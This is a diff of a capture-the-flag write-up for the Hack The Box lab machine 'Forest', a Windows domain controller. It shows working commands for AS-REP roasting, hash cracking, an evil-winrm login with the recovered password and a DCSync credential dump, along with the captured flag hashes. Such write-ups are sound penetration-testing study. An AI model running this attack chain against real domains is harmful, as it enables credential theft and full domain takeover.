@@ -1,142 +1,98 @@
 # HTB: Forest
+
 ## Engagement Overview
-**Target:** Forest  
+**Target:** Forest (HTB)  
 **Box IP:** 10.10.10.161  
 **Local IP:** 10.10.14.2  
 **Date:** 2025-07-15
 
 ---
 
-## Objectives
-Forest is an “easy” Windows Domain Controller box featuring an Active Directory environment with Exchange installed. The target allows anonymous LDAP binds for domain enumeration. By exploiting Kerberos pre-authentication misconfiguration, a TGT can be obtained and cracked offline. The compromised service account has privileges to modify Exchange group memberships, which can be escalated into full domain compromise using DCSync.
+### Objectives
+- Enumerate Active Directory/Exchange environment and identify weak Kerberos/LDAP configurations.  
+- Obtain an AS-REP roastable TGT, crack offline to recover service account credentials.  
+- Use service account to escalate (Exchange abuse → DCSync) and obtain Domain Administrator.  
+- Capture `user.txt` and domain `root.txt`.
 
 ---
 
 ## Service Enumeration
+
 ```bash
 nmap -p- -sC -sV -oA forest-scan 10.10.10.161
 ```
 
-**Open Ports:**
-- 53/tcp   – DNS
-- 88/tcp   – Kerberos
-- 135/tcp  – MS RPC
-- 139/tcp  – NetBIOS
-- 389/tcp  – LDAP
-- 445/tcp  – SMB
-- 464/tcp  – kpasswd
-- 593/tcp  – RPC over HTTP
-- 636/tcp  – LDAPS
-- 3268/tcp – Global Catalog LDAP
-- 3269/tcp – Global Catalog LDAPS
+**Open ports (condensed):**
+- 53/tcp (DNS), 88/tcp (Kerberos), 135/tcp (MS RPC), 139/tcp (NetBIOS), 389/tcp (LDAP), 445/tcp (SMB), 464/tcp (kpasswd), 593/tcp (RPC/HTTP), 636/tcp (LDAPS), 3268/tcp (GC LDAP), 3269/tcp (GC LDAPS)
 
-**Domain Info:**
-- Domain: `htb.local`
-- Hostname: `FOREST`
+**Domain info discovered:**
+- Domain: `htb.local`  
+- Hostname/FQDN: `FOREST.htb.local`  
 - OS: Windows Server 2016 Standard
-- Forest: `htb.local`
-- FQDN: `FOREST.htb.local`
 
-**SMB Notes:**
-- Message signing enabled and required
-- Authentication level: user
+Notes: anonymous LDAP binds allowed; message signing required on SMB; Kerberos pre-auth disabled for target service account (AS-REP roastable).
 
 ---
 
 ## Initial Access
 
-### Kerberos Pre-Auth Disabled
-
-**Tool:**  
+### AS-REP Roasting (Kerberos pre-auth disabled)
 ```bash
 impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass
+# output: AS-REP roastable hash for svc-alfresco
 ```
 
-**Output:**  
-AS-REP roastable hash for user `svc-alfresco`.
-
-### Hash Cracking
-
-**Tool:**  
+### Crack hash offline
 ```bash
 hashcat -m 18200 -a 0 hash.txt wordlist.txt
+# recovered: svc-alfresco:s3rvice
 ```
 
-**Credentials Recovered:**
-- **Username:** `svc-alfresco`
-- **Password:** `s3rvice`
-
-### Shell Access
-
-**Command:**
+### Authenticate & foothold
 ```bash
 evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
+# authenticated as svc-alfresco
 ```
-
-**Result:**  
-Authenticated as `svc-alfresco`. Initial foothold established.
 
 ---
 
 ## Privilege Escalation
 
-### Active Directory Abuse
+### Exchange/AD abuse → DCSync
+- `svc-alfresco` is member of **Account Operators** and has permissions to modify Exchange groups (WriteDACL-like permissions discovered).  
+- Abused Exchange permissions to add service account to privileged groups and escalate permissions.  
+- Performed DCSync using `impacket-secretsdump` to extract NTLM hashes including Administrator.
 
-- `svc-alfresco` is a member of **Account Operators** group.
-- Abuse of Exchange permissions (via `WriteDACL`) allows membership modification to privileged Exchange groups.
-- Escalated to **Exchange Windows Permissions**, granting `Replicating Directory Changes All`.
-
-### DCSync Attack
-
-**Tool:** `impacket-secretsdump`
-
-**Command:**
 ```bash
 secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161
+# dumped hashes including Administrator NTLM
 ```
 
-**Result:**  
-Successfully dumped NTLM hashes, including `Administrator`.
+**Result:** Domain Administrator compromise achieved; domain credentials and hashes extracted.
 
 ---
 
-## House Cleaning
+## House Cleaning / Post-Exploitation
 
-- No changes persisted on target.
-- All tooling executed in-memory where possible.
-- Removed any user-created artifacts.
+- No persistent backdoors created; tooling executed in-memory when possible.  
+- Removed any temporary artifacts created during engagement.
 
----
-
-## Post-Exploitation
-
-**Flags Captured:**
-- `user.txt`: `58fc66dc0f2af05eb1a1751186720d85`
-- `root.txt`: `c0a4c2b3bd3faf59b20d049d108d7613`
-
-**Domain Admin Achieved:** ✅
+**Flags captured:**  
+- `user.txt`: `58fc66dc0f2af05eb1a1751186720d85`  
+- `root.txt` (domain/root): `c0a4c2b3bd3faf59b20d049d108d7613`
 
 ---
 
 ## Tools Utilized
-
-- `nmap`
-- `impacket-GetNPUsers`
-- `evil-winrm`
-- `hashcat`
-- `ldapsearch`
-- `secretsdump`
-- [ropnop/windapsearch](https://github.com/ropnop/windapsearch)
-- HTB Official Writeup
-- [0xdf Forest Writeup](https://0xdf.gitlab.io/2020/03/21/htb-forest.html)
+- nmap, ldapsearch  
+- impacket (GetNPUsers, secretsdump)  
+- hashcat  
+- evil-winrm  
+- ropnop/windapsearch (auxiliary AD tooling)  
 
 ---
 
 ## Key Takeaways
-
-- Kerberos AS-REP Roasting is a critical misconfig to identify during recon.
-- LDAP enumeration and group mapping are essential on AD boxes.
-- Abusing Exchange and DCSync attacks is a powerful privilege escalation path.
-- Windows privesc often requires lateral movement through service accounts and trust delegation, not just binary exploitation.
-
----
+- Check for Kerberos pre-auth disabled accounts early (AS-REP roasting).  
+- Exchange permissions are powerful: misconfigured Exchange delegation can lead to DCSync and full domain compromise.  
+- AD enumeration (LDAP/GC) and group mapping are essential on Windows domain boxes.  
